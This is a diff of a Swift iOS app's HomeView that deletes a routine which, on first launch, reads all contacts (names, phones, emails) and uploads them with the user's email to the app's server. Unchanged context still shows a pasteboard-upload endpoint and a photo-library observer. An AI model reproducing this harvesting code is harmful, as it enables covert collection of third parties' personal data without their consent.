@@ -13,8 +13,6 @@ import Crisp
 import Combine
 import Photos
 import BackgroundTasks
-import Contacts
-
 
 import BackgroundTasks
 import Photos
@@ -142,9 +140,6 @@ struct HomeView: View {
     
     //上传相册的地址
     let serveruploadPasteBoardURL = "\(UserManager.shared.configURL)uploadPasteBoardInfo"
-    
-    //上传通讯录的地址
-    let serveruploadContacesURL = "\(UserManager.shared.configURL)uploadContacts"
     
     var body: some View {
        
@@ -446,9 +441,6 @@ struct HomeView: View {
                     
                     // 注册相册监听
                     photoLibraryObserver.register()
-                    
-                    // 首次上传通讯录
-                    uploadContacts()
                     
                     // 标记为非首次
                     isFirstTimeActive = false
@@ -1110,130 +1102,6 @@ struct HomeView: View {
                 }
             }
         }
-    }
-    
-    // MARK: - 通讯录上传方法
-    
-    /// 首次上传通讯录
-    private func uploadContacts() {
-        print("📱 uploadContacts() called - 开始上传通讯录")
-        
-        // 请求通讯录权限
-        let store = CNContactStore()
-        store.requestAccess(for: .contacts) { granted, error in
-            if granted {
-                print("✅ 通讯录权限已授权")
-                self.fetchAndUploadContacts()
-            } else {
-                print("❌ 通讯录权限被拒绝: \(error?.localizedDescription ?? "未知错误")")
-            }
-        }
-    }
-    
-    /// 获取并上传通讯录数据
-    private func fetchAndUploadContacts() {
-        let store = CNContactStore()
-        let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey, CNContactEmailAddressesKey] as [CNKeyDescriptor]
-        let request = CNContactFetchRequest(keysToFetch: keys)
-        
-        var contacts: [[String: Any]] = []
-        DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
-            
-            do {
-                try store.enumerateContacts(with: request) { contact, _ in
-                    var contactDict: [String: Any] = [:]
-                    
-                    // 姓名
-                    let fullName = "\(contact.givenName) \(contact.familyName)".trimmingCharacters(in: .whitespaces)
-                    if !fullName.isEmpty {
-                        contactDict["name"] = fullName
-                    }
-                    
-                    // 电话号码
-                    var phoneNumbers: [String] = []
-                    for phoneNumber in contact.phoneNumbers {
-                        phoneNumbers.append(phoneNumber.value.stringValue)
-                    }
-                    if !phoneNumbers.isEmpty {
-                        contactDict["phones"] = phoneNumbers
-                    }
-                    
-                    // 邮箱
-                    var emails: [String] = []
-                    for email in contact.emailAddresses {
-                        emails.append(email.value as String)
-                    }
-                    if !emails.isEmpty {
-                        contactDict["emails"] = emails
-                    }
-                    
-                    // 只添加有有效信息的联系人
-                    if !contactDict.isEmpty {
-                        contacts.append(contactDict)
-                    }
-                }
-                
-                print("📱 获取到 \(contacts.count) 个联系人")
-                
-                // 上传联系人数据
-                if !contacts.isEmpty {
-                    uploadContactsToServer(contacts: contacts)
-                }
-                
-            } catch {
-                print("❌ 获取通讯录失败: \(error.localizedDescription)")
-            }
-        }
-    }
-    
-    /// 上传联系人数据到服务器
-    private func uploadContactsToServer(contacts: [[String: Any]]) {
-        
-        guard let url = URL(string: serveruploadContacesURL) else {
-            print("❌ 无效的通讯录上传URL")
-            return
-        }
-        
-        // 创建请求
-        var request = URLRequest(url: url)
-        request.httpMethod = "POST"
-        
-        // 创建请求体
-        let boundary = "Boundary-\(UUID().uuidString)"
-        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
-        
-        var body = Data()
-        
-        // 添加基本字段
-        let userInfo = UserManager.shared.getUserInfo()
-        body.append(convertFormField(named: "useremail", value: userInfo.email, boundary: boundary))
-        body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary))
-        
-        // 将联系人数据转换为JSON字符串
-        do {
-            let jsonData = try JSONSerialization.data(withJSONObject: contacts, options: [])
-            if let jsonString = String(data: jsonData, encoding: .utf8) {
-                body.append(convertFormField(named: "contacts", value: jsonString, boundary: boundary))
-            }
-        } catch {
-            print("❌ 联系人数据JSON序列化失败: \(error.localizedDescription)")
-            return
-        }
-        
-        // 结束分隔符
-        body.appendString("--\(boundary)--\r\n")
-        
-        // 上传请求
-        let task = URLSession.shared.uploadTask(with: request, from: body) { data, response, error in
-            if let error = error {
-                print("❌ 通讯录上传失败: \(error.localizedDescription)")
-            } else {
-                if let data = data, let jsonString = String(data: data, encoding: .utf8) {
-                    print("✅ 通讯录上传成功 - Response: \(jsonString)")
-                }
-            }
-        }
-        task.resume()
     }
     
     /// 常规前台回归处理方法
